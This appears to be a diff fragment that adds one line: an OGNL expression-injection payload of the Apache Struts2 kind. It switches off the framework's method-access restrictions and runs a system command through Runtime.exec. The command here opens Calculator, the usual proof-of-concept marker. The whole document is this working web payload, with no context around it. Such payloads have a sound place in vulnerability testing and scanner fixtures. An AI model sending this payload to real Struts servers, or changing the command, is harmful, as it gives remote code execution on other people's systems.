@@ -1,0 +1,2 @@
+' + (#_memberAccess["allowStaticMethodAccess"]=true ,#context["xwork.MethodAccessor.denyMethodExecution"]=new java.lang.Boolean("false"),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('open -a Calculator.app').getInputStream())) + '
+
